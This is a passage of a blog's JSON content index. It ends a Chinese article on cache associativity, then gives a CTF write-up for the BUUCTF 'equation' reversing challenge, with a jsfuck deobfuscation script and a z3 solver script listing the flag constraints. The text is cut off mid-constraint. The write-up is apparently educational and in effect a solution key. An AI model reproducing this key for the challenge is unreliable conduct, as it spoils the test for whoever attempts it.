type=\"1\">\r\n<li>假如它是直接映射缓存，由于它往往使用地址的低位直接映射缓存线编号，所以所有的32K倍数的地址（32K，64K，96K等）都会映射到同一条线上（即第0线）。假如程序的内存组织不当，交替的去访问布置在这些地址的数据，则会导致冲突。从外表看来就好像缓存只有1条线了，尽管其他缓存线一直是空闲着的。</li>\r\n<li>如果是全相联缓存，那么每条缓存线都是独立的，可以对应于内存中的任意缓存线。只有当所有的512条缓存线都被占满后才会出现冲突。</li>\r\n<li>组相联是前两者的折中，每一路中的缓存线采用直接映射方式，而在路与路之间，缓存控制器使用全相联映射算法，决定选择一组中的哪一条线。</li>\r\n<li>如果是2路组相联缓存，那么这512条缓存线就被分为了2路，每路256条线，一路16KB。此时所有为16K整数倍的地址（16K，32K，48K等）都会映射到第0线，但由于2路是关联的，所以可以同时有2个这种地址的内容被缓存，不会发生冲突。当然了，如果要访问第三个这种地址，还是要先腾空已有的一条才行。所以极端情况下，从外表看来就好像缓存只有2条线了，尽管其他缓存线一直是空闲着的。</li>\r\n<li>如果是8路组相联缓存（与文中示例相同），那么这512条缓存线就被分为了8路，每路64条线，一路4KB。所以如果数组中元素地址是4K对齐的，并且程序交替的访问这些元素，就会出现组冲突。从外表看来就好像缓存只有8条线了，尽管其他缓存线一直是空闲着的。</li>\r\n</ol></li>\r\n</ol>\r\n<p><a href=\"https://my.oschina.net/fileoptions/blog/1630855\">原文链接</a></p>\r\n","categories":["Computer Architecture"],"tags":["cache","arch"]},{"title":"equation","url":"/2022/09/16/equation/","content":"<p>一道<code>jsfuck</code>的逆向题目，同时需要利用z3工具进行求解，在此记录下，以免忘记。</p>\r\n<h2 id=\"题目地址\">题目地址</h2>\r\n<p>题目地址在<a href=\"https://buuoj.cn/challenges#equation\">buuctf</a></p>\r\n<h2 id=\"题目分析\">题目分析</h2>\r\n<p>下载题目附件，打开压缩包发现为一个网页，打开网页后显示内容为空白，按Ctrl+U查看网页源码，为一长串js代码，其中进行了js混淆。</p>\r\n<span id=\"more\"></span>\r\n<figure>\r\n<img src=\"/2022/09/16/equation/image-20220916101931826.png\" alt=\"image-20220916101931826\"><figcaption aria-hidden=\"true\">image-20220916101931826</figcaption>\r\n</figure>\r\n<p>分析js代码含义，先判断flag长度为0x2a，然后对flag进行切分，将每个字母映射为ASCII码值，赋值给<code>l</code>数组，然后对l数组内容进行判断（其中添加了js混淆），因此要想求出flag，首先需要反js混淆，然后利用z3求解出l的内容，再还原出flag。</p>\r\n<h3 id=\"js混淆还原\">js混淆还原</h3>\r\n<p>使用脚本对js还原：</p>\r\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">deEquation</span>(<span class=\"params\">str</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">1</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  str = str.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/l\\[(\\D*?)](\\+l|-l|==)/g</span>, <span class=\"function\">(<span class=\"params\">m, a, b</span>) =&gt;</span> <span class=\"string\">&#x27;l[&#x27;</span> + <span class=\"built_in\">eval</span>(a) + <span class=\"string\">&#x27;]&#x27;</span> + b);</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">  str = str.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/==(\\D*?)&amp;&amp;/g</span>, <span class=\"function\">(<span class=\"params\">m, a</span>) =&gt;</span> <span class=\"string\">&#x27;==&#x27;</span> + <span class=\"built_in\">eval</span>(a) + <span class=\"string\">&#x27;&amp;&amp;&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"keyword\">return</span> str;</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">s = <span class=\"string\">&quot;xxxxxxx&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">ss=<span class=\"title function_\">deEquation</span>(s);</span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">write</span>(ss);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>上述脚本来源于<a href=\"https://www.cnblogs.com/Mayfly-nymph/p/12664176.html#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E8%A7%A3%E6%B3%95\">此</a></p>\r\n</blockquote>\r\n<p>将上述脚本编写到html页面中，浏览器打开网页，得到还原后的等式。</p>\r\n<figure>\r\n<img src=\"/2022/09/16/equation/image-20220916102737190.png\" alt=\"image-20220916102737190\"><figcaption aria-hidden=\"true\">image-20220916102737190</figcaption>\r\n</figure>\r\n<p>最后一个未还原的公式（<code>+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]])</code>）使用<a href=\"https://www.bugku.com/tools/jsfuck/#\">在线工具</a>进行还原得到结果为81</p>\r\n<h3 id=\"z3求解\">z3求解</h3>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> z3 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">l = [Int(<span class=\"string\">&quot;l%d&quot;</span>%i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x2a</span>)]  <span class=\"comment\"># 定义变量</span></span><br><span class=\"line\">s = Solver()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> l:  <span class=\"comment\"># 添加约束条件</span></span><br><span class=\"line\">    s.add(i &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    s.add(i &lt; <span class=\"number\">255</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">40</span>]+l[<span class=\"number\">35</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">41</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">30</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">27</span>]+l[<span class=\"number\">28</span>]+l[<span class=\"number\">21</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">4</span>]==<span class=\"number\">861</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">31</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">11</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">30</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">10</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">36</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">6</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">35</span>]==-<span class=\"number\">448</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">26</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">13</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">20</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">10</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">16</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">41</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">0</span>]==<span class=\"number\">1244</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">5</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">11</span>]-l[<span class=\"number\">14</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">29</span>]==-<span class=\"number\">39</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">41</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">35</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">27</span>]==<span class=\"number\">485</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">13</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">20</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">6</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">34</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">11</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">28</span>]==-<span class=\"number\">1068</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">32</span>]+l[<span class=\"number\">0</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">15</span>]+l[<span class=\"number\">19</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">20</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">31</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">30</span>]+l[<span class=\"number\">29</span>]-l[<span class=\"number\">4</span>]==<span class=\"number\">939</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">19</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">40</span>]+l[<span class=\"number\">25</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">23</span>]+l[<span class=\"number\">14</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">35</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">5</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">38</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">2</span>]+l[<span class=\"number\">30</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">26</span>]==<span class=\"number\">413</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">22</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">35</span>]+l[<span class=\"number\">17</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">24</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">31</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">1</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">29</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">21</span>]-l[<span class=\"number\">18</span>]-l[<span class=\"number\">6</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">13</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">32</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">7</span>]==<span class=\"number\">117</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">32</span>]+l[<span class=\"number\">16</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">25</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">40</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">12</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">5</span>]-l[<span class=\"number\">38</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">0</span>]==-<span class=\"number\">313</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">40</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">7</span>]+l[<span class=\"number\">33</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">14</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">24</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">26</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">11</span>]+l[<span class=\"number\">4</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">18</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">30</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">19</span>]+l[<span class=\"number\">21</span>]+l[<span class=\"number\">25</span>]-l[<span class=\"number\">15</span>]==-<span class=\"number\">42</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">21</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">39</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">20</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">3</span>]-l[<span class=\"number\">6</span>]+l[<span class=\"number\">28</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">37</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">41</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">18</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">19</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">14</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">4</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">33</span>]==<span class=\"number\">289</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">29</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">17</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">14</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">35</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">20</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">18</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">11</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">6</span>]+l[<span class=\"number\">22</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">10</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">28</span>]-l[<span class=\"number\">26</span>]==-<span class=\"number\">117</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">5</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">0</span>]-l[<span class=\"number\">27</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">16</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">15</span>]-l[<span class=\"number\">35</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">34</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">1</span>]+l[<span class=\"number\">20</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">19</span>]-l[<span class=\"number\">4</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">30</span>]-l[<span class=\"number\">10</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">23</span>]-l[<span class=\"number\">3</span>]-l[<span class=\"number\">33</span>]==-<span class=\"number\">252</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">29</span>]+l[<span class=\"number\">10</span>]-l[<span class=\"number\">41</span>]-l[<span class=\"number\">9</span>]+l[<span class=\"number\">12</span>]-l[<span class=\"number\">28</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">27</span>]-l[<span class=\"number\">8</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">23</span>]+l[<span class=\"number\">39</span>]-l[<span class=\"number\">1</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">15</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">20</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">22</span>]-l[<span class=\"number\">3</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">34</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">26</span>]+l[<span class=\"number\">13</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">7</span>]-l[<span class=\"number\">37</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">2</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">17</span>]==-<span class=\"number\">183</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">6</span>]-l[<span class=\"number\">8</span>]-l[<span class=\"number\">20</span>]+l[<span class=\"number\">34</span>]-l[<span class=\"number\">33</span>]-l[<span class=\"number\">25</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">3</span>]+l[<span class=\"number\">17</span>]-l[<span class=\"number\">13</span>]-l[<span class=\"number\">15</span>]-l[<span class=\"number\">40</span>]+l[<span class=\"number\">1</span>]-l[<span class=\"number\">30</span>]-l[<span class=\"number\">14</span>]-l[<span class=\"number\">28</span>]-l[<span class=\"number\">35</span>]+l[<span class=\"number\">38</span>]-l[<span class=\"number\">22</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">29</span>]+l[<span class=\"number\">5</span>]+l[<span class=\"number\">9</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">23</span>]-l[<span class=\"number\">18</span>]+l[<span class=\"number\">19</span>]-l[<span class=\"number\">21</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">36</span>]+l[<span class=\"number\">41</span>]-l[<span class=\"number\">7</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">31</span>]==<span class=\"number\">188</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">3</span>]+l[<span class=\"number\">6</span>]-l[<span class=\"number\">41</span>]+l[<span class=\"number\">10</span>]+l[<span class=\"number\">39</span>]+l[<span class=\"number\">37</span>]+l[<span class=\"number\">1</span>]+l[<span class=\"number\">8</span>]+l[<span class=\"number\">21</span>]+l[<span class=\"number\">24</span>]+l[<span class=\"number\">29</span>]+l[<span class=\"number\">12</span>]+l[<span class=\"number\">27</span>]-l[<span class=\"number\">38</span>]+l[<span class=\"number\">11</span>]+l[<span class=\"number\">23</span>]+l[<span class=\"number\">28</span>]+l[<span class=\"number\">33</span>]-l[<span class=\"number\">31</span>]+l[<span class=\"number\">14</span>]-l[<span class=\"number\">5</span>]+l[<span class=\"number\">32</span>]-l[<span class=\"number\">17</span>]+l[<span class=\"number\">40</span>]-l[<span class=\"number\">34</span>]+l[<span class=\"number\">20</span>]-l[<span class=\"number\">22</span>]-l[<span class=\"number\">16</span>]+l[<span class=\"number\">19</span>]+l[<span class=\"number\">2</span>]-l[<span class=\"number\">36</span>]-l[<span class=\"number\">7</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">15</span>]+l[<span class=\"number\">26</span>]-l[<span class=\"number\">0</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">35</span>]==<span class=\"number\">1036</span>)</span><br><span class=\"line\">s.add(l[<span class=\"number\">28</span>]-l[<span class=\"number\">33</span>]+l[<span class=\"number\">2</span>]+l[<span class=\"number\">37</span>]-l[<span class=\"number\">12</span>]-l[<span class=\"number\">9</span>]-l[<span class=\"number\">39</span>]+l[<span class=\"number\">16</span>]-l[<span class=\"number\">32</span>]+l[<span class=\"number\">8</span>]-l[<span class=\"number\">36</span>]+l[<span class=\"number\">31</span>]+l[<span class=\"number\">10</span>]-l[<span class=\"number\">4</span>]+l[<span class=\"number\">21</span>]-l[<span class=\"number\">25</span>]+l[<span class=\"number\">18</span>]+l[<span class=\"number\">24</span>]-l[<span class=\"number\">0</span>]+l[<span class=\"number\">29</span>]-l[<span 